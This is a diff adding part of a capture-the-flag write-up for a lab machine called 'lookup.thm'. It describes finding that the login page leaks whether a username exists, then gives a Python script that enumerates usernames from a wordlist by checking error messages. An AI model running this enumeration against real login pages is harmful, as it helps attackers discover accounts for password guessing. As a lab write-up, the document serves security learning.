@@ -51,3 +51,48 @@ Now, when we refresh the page, we are presented with a login page:
 
 ![login](https://github.com/user-attachments/assets/041b52b3-515b-4b6f-90e8-869505aad06c)
 
+At first, I tried to log in with some common default credentials, admin:admin. There was a message that appears saying wrong password. 
+
+![wrongpw](https://github.com/user-attachments/assets/ec109c9e-ed8e-4309-b667-272dcc0f166b)
+
+This made me think that the login page will display errors specific to the username being correct or not. To test this theory I attempted to log in with bob:admin, and this time the error states, Wrong username or password.
+
+![wrongun](https://github.com/user-attachments/assets/f8350a30-71a1-4314-a471-064b22f3e7aa)
+
+To find out the correct user names for login I used this python script against the login:
+``` bash
+import requests
+
+# Target URL
+url = "http://lookup.thm/login.php"
+
+# Define path to usernames
+file_path = "/usr/share/seclists/Usernames/Names/names.txt"
+
+try:
+    with open(file_path, "r") as file:
+        for line in file:
+            username = line.strip()
+            if not username:
+                continue  # Skip empty lines
+
+            # Prepare the POST data
+            data = {
+                "username": username,
+                "password": "password"  # Fixed password for testing (note the correction here)
+            }
+
+            # Send the POST request
+            response = requests.post(url, data=data)
+
+            # Check the response content
+            if "Wrong password" in response.text:
+                print(f"Username found: {username}")
+            elif "wrong username" in response.text:
+                continue  # Silent continuation for wrong username
+
+except FileNotFoundError:
+    print(f"Error: The file {file_path} does not exist.")
+except requests.RequestException as e:
+    print(f"Error: An HTTP request error occurred: {e}")
+```
